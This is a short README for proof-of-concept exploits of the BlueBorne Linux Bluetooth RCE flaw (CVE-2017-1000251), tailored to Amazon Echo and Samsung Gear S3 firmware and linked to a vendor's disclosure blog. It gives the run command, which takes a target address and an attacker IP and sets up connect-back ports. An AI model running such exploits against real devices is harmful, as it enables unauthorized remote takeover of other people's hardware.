BlueBorne Linux RCE Exploits
=============================

This directory contains a PoC code for the Linux-RCE vulnerability (CVE-2017-1000251).
The exploits are specifically tailored for specific fw images of two devices: The Amazon Echo and Samsung Gear S3.

To run (either exploit script, found under the relavant device dir):

    sudo python2 exploit.py <src-hci> <target-bdaddr> <attacker-ip> (optional-connectback-port1=1234) (optional-connectback-port2=1235)

IP needs to be accessible from the victim (should be the IP of the machine that runs the exploit)


A blog post on these exploits can be found here:
https://www.armis.com/armis-demonstrates-bluetooth-worm-and-linux-exploit-at-black-hat/

A detailed whitepaper in the above link as well.